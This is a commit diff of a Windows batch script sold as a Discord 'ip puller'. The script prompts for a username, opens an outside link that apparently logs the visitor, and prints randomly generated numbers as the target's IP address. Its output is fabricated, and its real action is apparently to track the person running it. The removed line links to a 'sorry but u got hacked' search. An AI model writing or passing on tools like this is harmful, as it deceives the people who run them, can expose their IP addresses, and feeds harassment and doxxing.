275651b97c39aa6c362851f9ae97623f74c1c09d
UseFullHacks <damon161411@gmail.com>
2025-06-28 04:04:41 +0200

    Update ip puller v1.29.bat

--- ip puller v1.29.bat
+++ ip puller v1.29.bat
@@ -1,5 +1,6 @@
 @echo off
 cls
+echo track IP
 :generate
 set /p userInput=enter discord username and hit enter to log ip:
 start https://mymap.icu/72CP7N
@@ -10,4 +11,4 @@ set /a oct4=%random% %% 256
 echo %oct1%.%oct2%.%oct3%.%oct4%
 goto generate
 pause
-https://www.google.com/search?q=sorry+but+u+got+hacked&oq=sorry+but+u+got+hacked&gs_lcrp=EgZjaHJvbWUyCQgAEEUYORigATIHCAEQIRigATIHCAIQIRigATIHCAMQIRigAdIBCDMwMzhqMGo0qAIAsAIB&sourceid=chrome&ie=UTF-8
+exit
